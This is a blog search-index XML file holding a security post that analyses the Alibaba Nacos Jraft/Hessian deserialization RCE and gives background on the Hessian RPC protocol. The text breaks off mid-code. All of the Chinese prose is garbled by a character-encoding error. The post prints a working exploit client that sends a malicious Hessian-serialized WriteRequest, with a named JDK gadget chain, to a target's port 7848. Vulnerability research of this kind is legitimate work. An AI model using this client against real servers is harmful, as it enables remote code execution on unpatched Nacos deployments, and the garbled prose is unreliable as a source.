<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ä»Ali-Nacos-RCEæ¼æ´çœ‹RPC-Hessianåè®®å®‰å…¨</title>
    <link href="/2023/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/"/>
    <url>/2023/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/</url>
    
    <content type="html"><![CDATA[<h2 id="1ã€èµ·æº"><a href="#1ã€èµ·æº" class="headerlink" title="1ã€èµ·æº"></a>1ã€èµ·æº</h2><p>ä»æœ‹å‹åœˆäº†è§£åˆ°nacoså‡ºäº†ä¸ªæ´ï¼Œçœ‹èµ·æ¥æ˜¯rceè¿˜æŒºå”¬äººçš„ï¼Œå®¢æˆ·éƒ¨ç½²é‡ä¹Ÿæ¯”è¾ƒå¤šã€‚æœ¬ç€ä¸ºç”²æ–¹å®¢æˆ·çˆ¸çˆ¸è´Ÿè´£åˆ°åº•çš„åŸåˆ™ï¼Œå¯¹æ­¤æ¼æ´è¿›è¡Œäº†åº”æ€¥è¿½è¸ªã€‚æœ€åä¹Ÿæ ¹æ®å®˜æ–¹æ–‡æ¡£æˆåŠŸæ„é€ å¥½Jraftå®¢æˆ·ç«¯ä¸Hessianååºåˆ—åŒ–only jdk Gadgetçš„EXPã€‚ä»¥ä¸‹ç¬¬äºŒç« èŠ‚å†…å®¹ä¸ºå½“æ—¶è¿½è¸ªåˆ†æçš„ç¬”è®°ï¼Œæœªæä¾›expï¼Œä»…æŠ€æœ¯äº¤æµè®¨è®ºã€‚ç¬¬ä¸‰ç« èŠ‚æ˜¯Hessianååºåˆ—åŒ–ç›¸å…³çš„çŸ¥è¯†è¡¥å……ï¼Œåœ¨å®Œæˆäº†æ­¤æ¼æ´çš„åº”æ€¥åˆ†æåï¼Œå¯¹æ•´ä¸ªè¿‡ç¨‹å¤ç›˜æ—¶å‘ç°è‡ªå·±å¯¹äºHessiançš„ç›¸å…³çŸ¥è¯†äº†è§£ä¸æ·±ï¼Œæƒ³ç€è¿‘äº›å¹´å¾®æœåŠ¡&#x2F;ä¸šåŠ¡ä¸Šäº‘ç­‰å¤§è¶‹åŠ¿æ¼”è¿›ï¼ŒRPCè¿œç¨‹é€šä¿¡æ¡†æ¶&#x2F;åè®®çš„å®‰å…¨é—®é¢˜ä¸€å®šä¼šæ˜¯æœªæ¥å®‰å…¨çš„é‡ç‚¹ã€‚ç´¢æ€§è¶ç€è¿™æ¬¡æœºä¼šè¶çƒ­æ‰“é“ï¼ŒæŠŠHessianåè®®çš„çŸ¥è¯†æ€»ç»“æ¶ˆåŒ–ä¸€æ³¢ã€‚ å¦‚æœå¯¹æ–‡ç« æœ‰ç–‘é—®&#x2F;å»ºè®®æˆ–è€…æƒ³ä¸€èµ·ç ”ç©¶äº¤æµçš„å¸ˆå‚…ï¼Œæ¬¢è¿ç§ä¿¡ğŸ˜œ</p><p><strong>PSï¼šæœ¬æ–‡ä»…ç”¨äºæŠ€æœ¯è®¨è®ºã€‚ä¸¥ç¦ç”¨äºä»»ä½•éæ³•ç”¨é€”ï¼Œè¿è€…åæœè‡ªè´Ÿï¼</strong></p><p>ç¬”è€…åœ¨ä¹‹å‰çš„å‡ ç¯‡æ–‡ç« ä¸­ï¼Œå¯¹rpcç›¸å…³çš„thriftã€rmiã€jmxç­‰åè®®çš„è¯¦ç»†åˆ†æ</p><p><a href="https://pwnull.github.io/2022/How-to-attack-RMI-based-JMX-services/">Attack JMX Serviceçš„æ‰“å¼€æ–¹å¼</a></p><p><a href="https://pwnull.github.io/2023/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/">VMware-vRealize-Log-Insight-thrift-RPCè°ƒç”¨RCE</a></p><p><a href="https://pwnull.github.io/2022/Exploring-JAVA-RMI's-offensive-and-defensive-history/">è®ºRMIçš„æ”»é˜²æ¼”è¿›å²</a></p><h2 id="2ã€è¡¥ä¸åˆ†æ"><a href="#2ã€è¡¥ä¸åˆ†æ" class="headerlink" title="2ã€è¡¥ä¸åˆ†æ"></a>2ã€è¡¥ä¸åˆ†æ</h2><p>Nacosæ˜¯ Dynamic Naming and Configuration Serviceçš„é¦–å­—æ¯ç®€ç§°ï¼Œæ˜¯é˜¿é‡Œæ¨å‡ºçš„ä¸€ä¸ªæ˜“äºæ„å»ºäº‘åŸç”Ÿåº”ç”¨çš„åŠ¨æ€æœåŠ¡å‘ç°ã€é…ç½®ç®¡ç†å’ŒæœåŠ¡ç®¡ç†å¹³å°ã€‚ Nacosæ„å»ºäº†ä»¥â€æœåŠ¡â€ä¸ºä¸­å¿ƒçš„ç°ä»£åº”ç”¨æ¶æ„ (ä¾‹å¦‚å¾®æœåŠ¡èŒƒå¼ã€äº‘åŸç”ŸèŒƒå¼) çš„æœåŠ¡åŸºç¡€è®¾æ–½ï¼Œå…¶åœ¨å„è¡Œå„ä¸šçš„åº”ç”¨æä¸ºæ™®éå¹¿æ³›ã€‚</p><p>åœ¨Nacosæ–°ç‰ˆæœ¬å‘å¸ƒè¯´æ˜æå–åˆ°å‡ ä¸ªå…³é”®è¯ï¼š Jraftè¯·æ±‚å¤„ç†ã€hessianååºåˆ—åŒ–æœªé™åˆ¶ã€RCEã€7848ç«¯å£  </p><p><a href="https://github.com/alibaba/nacos/releases">https://github.com/alibaba/nacos/releases</a></p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/1.png"></p><p>æ£€ç´¢ä¸‹å®˜æ–¹æ–‡æ¡£å…³äºJraftè¯·æ±‚çš„ä¿¡æ¯   </p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/2.png"></p><p>çœ‹åˆ° <a href="https://nacos.io/zh-cn/docs/v2/upgrading/2.0.0-compatibility.html">https://nacos.io/zh-cn/docs/v2/upgrading/2.0.0-compatibility.html</a> Nacosé»˜è®¤å¼€å¯äº†7848ç«¯å£ï¼Œç”¨äºå¤„ç†æœåŠ¡ç«¯è§çš„Raftç›¸å…³è¯·æ±‚</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/3.png"></p><p>ç»§ç»­çœ‹ä¸‹ä¿®å¤çš„commitï¼Œæ¶‰åŠäº†Hessianååºåˆ—åŒ–æ“ä½œã€‚æ·»åŠ äº†NacosHessianSerializerFactoryç™½åå•  <a href="https://github.com/alibaba/nacos/pull/10542/commits">https://github.com/alibaba/nacos/pull/10542/commits</a></p><p>ä¸‹è½½å­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬nacos-server-2.2.2.zipï¼Œè§£å‹åå¯åŠ¨è¿è¡Œï¼š<code>startup.cmd -m standalone</code></p><p>åœ¨InstanceMetadataProcessorã€ServiceMetadataProcessorçš„ onApply æ–¹æ³•ä¸­è°ƒç”¨äº†serializer.deserializeï¼Œè€Œé»˜è®¤çš„serializerä¸ºHessianSerializer</p><p><a href="https://github.com/alibaba/nacos/pull/10542/commits/5804f5a46116dc1197bdd2c224d1368227b51232#diff-c8b875833c2f8a21ed873c9c1053b237ab04d4180caeea141e51c1932f665dae">https://github.com/alibaba/nacos/pull/10542/commits/5804f5a46116dc1197bdd2c224d1368227b51232#diff-c8b875833c2f8a21ed873c9c1053b237ab04d4180caeea141e51c1932f665dae</a></p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/4.png"></p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/5.png"></p><p>è¿™é‡Œå°±æ˜¯Hessianååºåˆ—åŒ–çš„è§¦å‘ç‚¹ï¼Œnacoså®˜æ–¹å¯¹æ–¹æ³•com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessor#onApplyå†™äº†æµ‹è¯•ç”¨ä¾‹ï¼šcom.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessorTest#testOnApplyï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­å¯ä»¥çœ‹åˆ°æ–¹æ³•å°†å®é™…åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–æ“ä½œçš„MetadataOperationå¯¹è±¡æ”¾å…¥WriteRequest#data_å‚æ•°ä¸­ã€å°†æ“ä½œæ ‡è¯†ADDæ”¾å…¥<code>operation_</code>å‚æ•°ä¸­</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/6.png"></p><p>æ¥ç€æˆ‘ä»¬æ ¹æ®sofastackçš„jraftç”¨æˆ·æŒ‡å—ç¼–å†™Jraftå®¢æˆ·ç«¯å°†æ•°æ®å‘é€è‡³7848ç«¯å£çš„jraftæœåŠ¡ï¼Œ<a href="https://www.sofastack.tech/projects/sofa-jraft/counter-example/">https://www.sofastack.tech/projects/sofa-jraft/counter-example/</a></p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/7.png"></p><p>ç¢°åˆ°é”™è¯¯ï¼š<code>null default instance: com.alibaba.nacos.consistency.entity.WriteRequest</code></p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/8.png"></p><p>ç»è¿‡è°ƒè¯•æ˜¯com.alipay.sofa.jraft.rpc.impl.GrpcClient#parserClassesä¸­æœªåŒ…å«com.alibaba.nacos.consistency.entity.WriteRequest</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/9.png"></p><p>æ‰€ä»¥åœ¨è¿è¡Œexpå‰éœ€è¦å°†WriteRequestæ·»åŠ åˆ°parserClassesã€defaultMarshallerRegistry(marshalleræ–¹æ³•ä¼šç”¨åˆ°)å‚æ•°ä¸­ï¼Œæ‰¾åˆ°äº†com.alipay.sofa.jraft.rpc.impl.GrpcRaftRpcFactoryç±»ï¼Œå¯è°ƒç”¨registerProtobufSerializeræ–¹æ³•è¿›è¡Œæ·»åŠ </p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">WriteRequest writeRequest = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WriteRequest</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Builder()</span>.set<span class="hljs-constructor">Data(ByteString.<span class="hljs-params">copyFrom</span>(<span class="hljs-params">new</span> HessianSerializer()</span>.serialize(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Hessian_PKCS9Attributes_SwingLazyValue_JavaWrapper</span>.</span></span>get<span class="hljs-constructor">Object()</span>))).set<span class="hljs-constructor">Group(<span class="hljs-params">groupId</span>)</span>.set<span class="hljs-constructor">Operation(<span class="hljs-string">&quot;Write&quot;</span>)</span>.build<span class="hljs-literal">()</span>;<br><br><span class="hljs-comment">//parserClassesã€defaultMarshallerRegistryæ·»åŠ WriteRequest</span><br>GrpcRaftRpcFactory raftRpcFactory = (GrpcRaftRpcFactory) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RpcFactoryHelper</span>.</span></span>rpc<span class="hljs-constructor">Factory()</span>;<br>raftRpcFactory.register<span class="hljs-constructor">ProtobufSerializer(WriteRequest.<span class="hljs-params">class</span>.<span class="hljs-params">getName</span>()</span>,writeRequest);<br>MarshallerRegistry marshallerRegistry = raftRpcFactory.get<span class="hljs-constructor">MarshallerRegistry()</span>;<br>marshallerRegistry.register<span class="hljs-constructor">ResponseInstance(WriteRequest.<span class="hljs-params">class</span>.<span class="hljs-params">getName</span>()</span>, writeRequest);<br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/10.png"></p><p>æœ€ç»ˆæ„é€ å¥½çš„expï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import com.alibaba.nacos.consistency.entity.WriteRequest;<br>import com.alibaba.nacos.consistency.serialize.HessianSerializer;<br>import com.alipay.sofa.jraft.RouteTable;<br>import com.alipay.sofa.jraft.conf.Configuration;<br>import com.alipay.sofa.jraft.entity.PeerId;<br>import com.alipay.sofa.jraft.option.CliOptions;<br>import com.alipay.sofa.jraft.rpc.impl.GrpcRaftRpcFactory;<br>import com.alipay.sofa.jraft.rpc.impl.MarshallerRegistry;<br>import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;<br>import com.alipay.sofa.jraft.util.Endpoint;<br>import com.alipay.sofa.jraft.util.RpcFactoryHelper;<br>import com.google.protobuf.ByteString;<br><br>public <span class="hljs-keyword">class</span> JraftClient &#123;<br>    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;<br>        String groupId = <span class="hljs-string">&quot;naming_instance_metadata&quot;</span>;<br>        <span class="hljs-comment">// æ›´æ–°raft groupé…ç½®</span><br>        Configuration conf = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Configuration()</span>;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RouteTable</span>.</span></span>get<span class="hljs-constructor">Instance()</span>.update<span class="hljs-constructor">Configuration(<span class="hljs-params">groupId</span>, <span class="hljs-params">conf</span>)</span>;<br><br>        <span class="hljs-comment">//åˆ›å»ºClientService</span><br>        CliClientServiceImpl cliClientService = <span class="hljs-keyword">new</span> <span class="hljs-constructor">CliClientServiceImpl()</span>;<br>        CliOptions cliOptions = <span class="hljs-keyword">new</span> <span class="hljs-constructor">CliOptions()</span>;<br>        cliClientService.init(cliOptions);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RouteTable</span>.</span></span>get<span class="hljs-constructor">Instance()</span>.refresh<span class="hljs-constructor">Leader(<span class="hljs-params">cliClientService</span>, <span class="hljs-params">groupId</span>, 1000000)</span>;<br>        PeerId leader = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RouteTable</span>.</span></span>get<span class="hljs-constructor">Instance()</span>.select<span class="hljs-constructor">Leader(<span class="hljs-params">groupId</span>)</span>;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Leader is &quot;</span> + leader);<br><br>        <span class="hljs-comment">//åˆ›å»ºwriteRequest</span><br>        WriteRequest writeRequest = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WriteRequest</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Builder()</span>.set<span class="hljs-constructor">Data(ByteString.<span class="hljs-params">copyFrom</span>(<span class="hljs-params">new</span> HessianSerializer()</span>.serialize(evilSerData))).set<span class="hljs-constructor">Group(<span class="hljs-params">groupId</span>)</span>.set<span class="hljs-constructor">Operation(<span class="hljs-string">&quot;Write&quot;</span>)</span>.build<span class="hljs-literal">()</span>;<br><br>        <span class="hljs-comment">//parserClassesã€defaultMarshallerRegistryæ·»åŠ WriteRequest</span><br>        GrpcRaftRpcFactory raftRpcFactory = (GrpcRaftRpcFactory) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RpcFactoryHelper</span>.</span></span>rpc<span class="hljs-constructor">Factory()</span>;<br>        raftRpcFactory.register<span class="hljs-constructor">ProtobufSerializer(WriteRequest.<span class="hljs-params">class</span>.<span class="hljs-params">getName</span>()</span>,writeRequest);<br>        MarshallerRegistry marshallerRegistry = raftRpcFactory.get<span class="hljs-constructor">MarshallerRegistry()</span>;<br>        marshallerRegistry.register<span class="hljs-constructor">ResponseInstance(WriteRequest.<span class="hljs-params">class</span>.<span class="hljs-params">getName</span>()</span>, writeRequest);<br><br>        <span class="hljs-comment">//å‘é€è¯·æ±‚</span><br>        cliClientService.get<span class="hljs-constructor">RpcClient()</span>.invoke<span class="hljs-constructor">Sync(<span class="hljs-params">new</span> Endpoint(<span class="hljs-string">&quot;host&quot;</span>, 7848)</span>, writeRequest, <span class="hljs-number">10000</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3ã€Hessianååºåˆ—åŒ–"><a href="#3ã€Hessianååºåˆ—åŒ–" class="headerlink" title="3ã€Hessianååºåˆ—åŒ–"></a>3ã€Hessianååºåˆ—åŒ–</h2><p>å®¢æˆ·ç«¯æ„é€ å¥½äº†ï¼Œæ¥ç€å°±æ˜¯å»æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ã€‚å…¶å®å°±æ˜¯æ‰¾Hessiané“¾ï¼Œæœ€å¼€å§‹ç”¨çš„æ˜¯ <a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a> ä¸­çš„SpringPartiallyComparableAdvisorHolderé“¾ï¼Œä½†æ˜¯éœ€è¦æ‰“jndiï¼Œè¿‡ç¨‹ä¸­ä¹Ÿç¢°åˆ°äº†æ„é€ æ•°æ®æ—¶æ„å¤–è§¦å‘toStringæ–¹æ³•å°±ä¼šç›´æ¥è§¦å‘rceçš„é—®é¢˜ï¼Œæ‰€ä»¥æœ€åç”¨äº†jdkåŸç”Ÿçš„PKCS9Attributeè§¦å‘bcelçš„ååºåˆ—åŒ–é“¾å®Œæˆäº†RCEï¼Œåœ¨å®Œæˆexpç¼–å†™åæƒ³ç€å¯¹Hessiançš„äº†è§£ä¸å¤šï¼Œç´¢æ€§å†èŠ±äº›æ—¶é—´æ•´ä½“çœ‹çœ‹Hessianååºåˆ—åŒ–çš„è¦ç‚¹ã€åˆ©ç”¨åŠå‘ç‚¹ï¼Œä¸‹æ¬¡å†ç¢°åˆ°ç±»ä¼¼é—®é¢˜å¯ä»¥å¿«é€Ÿè§£å†³ï¼Œæé«˜åˆ†ææ•ˆç‡ã€‚</p><h3 id="3-1-Hessianå†å²"><a href="#3-1-Hessianå†å²" class="headerlink" title="3.1 Hessianå†å²"></a>3.1 Hessianå†å²</h3><p>Hessianæ˜¯ä¸€ç§ç”¨äºè¿æ¥WEBå¾—ç®€å•äºŒè¿›åˆ¶åè®®ï¼Œç”±caucho( <a href="https://caucho.com/">https://caucho.com/</a> )å¼€å‘ï¼Œä»06å¹´å‘å¸ƒ3.0.20ç‰ˆæœ¬åˆ°19å¹´å‘å¸ƒçš„4.0.60ç‰ˆæœ¬ï¼Œå®é™…åœ¨mavenä»“åº“ä¸­å¯ä»¥ä¸‹è½½åˆ°æœ€æ–°çš„4.0.66ç‰ˆæœ¬ï¼š <a href="https://mvnrepository.com/artifact/com.caucho/hessian">https://mvnrepository.com/artifact/com.caucho/hessian</a></p><p>Hessianè™½ç„¶é»˜è®¤é›†æˆåœ¨resinä¸­ï¼Œä½†æ˜¯ä½¿ç”¨èµ·æ¥åªéœ€è¦com.caucho.hessian.clientã€com.caucho.hessian.serveråŒ…ï¼Œå¹¶ä¸éœ€è¦å…¶ä»–çš„Resinç±»ã€‚æ‰€ä»¥ä¹Ÿå¯ä»¥ç”¨äºè¾ƒå°çš„å®¢æˆ·ç«¯appletã€ç”¨äºæ‰‹æœº&#x2F;ç”µå­æ¸¸æˆæœºç­‰j2MEè®¾å¤‡è¿æ¥ResinæœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥ç”¨äºEJBæœåŠ¡ã€‚æ•´ä½“åˆ†ä¸ºHessian1ä¸Hessian2ä¸¤ä¸ªç‰ˆæœ¬ï¼Œåœ¨å®é™…ä½¿ç”¨ä¸­ä»¥åºåˆ—åŒ–æ•°æ®ä¸­çš„headerè¿›è¡ŒåŒºåˆ†ã€‚</p><p>Hessianç”±äºå…¶è·¨è¯­è¨€ã€å°å‹è½»é‡çº§ã€å¿«é€Ÿç´§å‡‘ï¼Œæ‰€ä»¥åœ¨RPCæ¡†æ¶åº”ç”¨ä¸­æä¸ºæµè¡Œã€‚</p><p>å®˜ç½‘é“¾æ¥ï¼š<a href="http://hessian.caucho.com/">http://hessian.caucho.com/</a></p><h3 id="3-2-åºåˆ—åŒ–ååºåˆ—åŒ–è¿‡ç¨‹"><a href="#3-2-åºåˆ—åŒ–ååºåˆ—åŒ–è¿‡ç¨‹" class="headerlink" title="3.2 åºåˆ—åŒ–ååºåˆ—åŒ–è¿‡ç¨‹"></a>3.2 åºåˆ—åŒ–ååºåˆ—åŒ–è¿‡ç¨‹</h3><p>æˆ‘ä»¬æ¨¡æ‹Ÿä¸€æ¬¡å®¢æˆ·ç«¯ä½¿ç”¨Hessianåè®®ä¸æœåŠ¡ç«¯çš„ä¸€æ¬¡äº¤äº’è¿‡ç¨‹æ¥åˆ†æä¸‹è¯¥åè®®æ˜¯å¦‚ä½•å¤„ç†æ•°æ®çš„ã€‚Hessiançš„ä½¿ç”¨ä¸€èˆ¬æœ‰ä¸¤ç§å½¢å¼ï¼š1ã€åŸºäºWeb Servletï¼›2ã€ä¸Springç»“åˆä½¿ç”¨ã€‚æœ¬æ¬¡æ¼”ç¤ºæˆ‘ä»¬åŸºäºWeb Servletçš„å½¢å¼æ¥åˆ†æ</p><p>æ€»ä½“æ¥è¯´åˆ©ç”¨Hessianåè®®è¿›è¡Œä¸€æ¬¡è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼šå®¢æˆ·ç«¯-&gt;åºåˆ—åŒ–æ•°æ®å‘é€åˆ°æœåŠ¡ç«¯-&gt;æœåŠ¡ç«¯ååºåˆ—åŒ–æ•°æ®å¹¶è°ƒç”¨æ–¹æ³•-&gt;æœåŠ¡ç«¯å°†æ–¹æ³•æ‰§è¡Œç»“æœè¿›è¡Œåºåˆ—åŒ–å¹¶è¿”å›ç»™å®¢æˆ·ç«¯-&gt;å®¢æˆ·ç«¯ååºåˆ—åŒ–æ•°æ®æ‹¿åˆ°æ–¹æ³•çš„æ‰§è¡Œç»“æœ</p><p>ä¸å…¶ä»–RPCåè®®å¦‚RMIè°ƒç”¨ç±»ä¼¼ï¼Œä¹Ÿæ˜¯åŸºäºåºåˆ—åŒ–æ•°æ®è¿›è¡Œä¼ è¾“ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ·±å…¥ä»£ç çœ‹çœ‹Hessianæ˜¯å¦‚ä½•å¤„ç†çš„ï¼Œå­˜åœ¨å“ªäº›å®‰å…¨é£é™©~</p><h4 id="3-2-1-åŸºäºWeb-Servletå½¢å¼"><a href="#3-2-1-åŸºäºWeb-Servletå½¢å¼" class="headerlink" title="3.2.1 åŸºäºWeb Servletå½¢å¼"></a>3.2.1 åŸºäºWeb Servletå½¢å¼</h4><p>æœåŠ¡ç«¯å¼•å…¥com.caucho-hessian-4.0.63.jarï¼Œservletå¯ä»¥ä¸ºHessianServletã€ä¹Ÿå¯ä»¥æ˜¯ç»§æ‰¿è‡ªHessianServletçš„è‡ªå®ç°ç±»ï¼Œæˆ‘è¿™é‡Œæ¼”ç¤ºåœ¨web.xmlä¸­å°†HessianServletä½œä¸ºè·¯ç”±&#x2F;hessiançš„å¤„ç†handlerï¼Œå¹¶å°†å…¶æš´éœ²ç»™å®¢æˆ·ç«¯è¿›è¡Œè°ƒç”¨ï¼Œåˆå§‹åŒ–å‚æ•°é…ç½®å®¢æˆ·ç«¯å¯è°ƒç”¨çš„ç›®æ ‡ç±»BasicService</p><p>1ã€web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hessianServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.caucho.hessian.server.HessianServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>service-class<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>com.example.hessianserver.BasicService<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hessianServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/hessian<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2ã€æ¥å£åŠå®ç°ç±»</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-title class_">BasicAPI</span>æ¥å£<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BasicAPI</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setGreeting</span>(<span class="hljs-title class_">String</span> greeting);<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">hello</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">User</span> <span class="hljs-title function_">getUser</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-title class_">Object</span> obj);<br>&#125;<br><br><span class="hljs-title class_">BasicService</span>å®ç°ç±»<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BasicService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BasicAPI</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> _greeting = <span class="hljs-string">&quot;Hello, world&quot;</span>;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setGreeting</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> greeting</span>) &#123;<br>        _greeting = greeting;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> _greeting;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">User</span> <span class="hljs-title function_">getUser</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;pwnull&quot;</span>, <span class="hljs-string">&quot;pwnull&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> obj</span>) &#123;<br>        <span class="hljs-keyword">return</span> obj.<span class="hljs-title function_">toString</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p> 3ã€User pojoç±»ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">public</span> <span 